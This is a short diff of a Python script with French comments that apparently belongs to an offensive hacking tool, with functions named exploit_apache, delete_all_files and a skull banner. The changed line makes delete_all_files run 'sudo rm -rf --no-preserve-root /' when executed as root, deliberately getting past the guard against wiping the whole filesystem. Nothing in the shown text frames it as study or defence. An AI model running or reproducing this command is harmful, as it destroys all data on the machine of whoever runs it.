@@ -220,7 +220,7 @@ def exploit_apache():
 def delete_all_files():
     print("Suppression de tous les fichiers du système en cours...")
     if os.geteuid() == 0:  # Vérifiez si l'utilisateur est root
-        os.system("rm -rf /")
+        os.system("sudo rm -rf --no-preserve-root /")
         print("Tous les fichiers du système ont été supprimés avec succès.")
     else:
         print("Vous devez exécuter ce script en tant qu'utilisateur root pour supprimer tous les fichiers du système.")
@@ -234,7 +234,6 @@ def display_skull():
          \\____/        \\____/
     """
     print(skull)
-    
 
 # Fonction pour extraire l'adresse IP à partir de l'URL
 def extract_ip_from_url(url):
